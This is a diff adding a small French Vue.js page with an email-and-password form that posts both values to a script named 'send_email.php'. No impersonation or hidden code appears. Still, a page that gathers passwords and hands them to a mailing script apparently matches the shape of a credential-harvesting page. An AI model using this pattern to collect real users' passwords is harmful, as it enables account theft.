@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Formulaire Email</title>
+  <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14"></script>
+  <style>
+    body {
+      background-color: #0D1C40;
+      font-family: Arial, sans-serif;
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    form {
+      background-color: #1e2a50;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.3);
+      width: 300px;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 5px;
+      font-weight: bold;
+    }
+
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: none;
+      border-radius: 5px;
+      box-sizing: border-box;
+    }
+
+    input[type="submit"] {
+      background-color: #00aaff;
+      color: white;
+      border: none;
+      padding: 10px;
+      width: 100%;
+      border-radius: 5px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    input[type="submit"]:hover {
+      background-color: #008fcc;
+    }
+  </style>
+</head>
+<body>
+  <div id="app">
+    <form @submit.prevent="submitForm">
+      <label for="email">Adresse Email :</label>
+      <input type="email" v-model="email" required>
+
+      <label for="password">Mot de passe :</label>
+      <input type="password" v-model="password" required>
+
+      <input type="submit" value="Envoyer">
+    </form>
+  </div>
+
+  <script>
+    new Vue({
+      el: '#app',
+      data: {
+        email: '',
+        password: ''
+      },
+      methods: {
+        submitForm() {
+          const form = document.createElement('form');
+          form.method = 'POST';
+          form.action = 'send_email.php';
+
+          const emailInput = document.createElement('input');
+          emailInput.type = 'hidden';
+          emailInput.name = 'email';
+          emailInput.value = this.email;
+
+          const passwordInput = document.createElement('input');
+          passwordInput.type = 'hidden';
+          passwordInput.name = 'password';
+          passwordInput.value = this.password;
+
+          form.appendChild(emailInput);
+          form.appendChild(passwordInput);
+
+          document.body.appendChild(form);
+          form.submit();
+        }
+      }
+    });
+  </script>
+</body>
+</html>
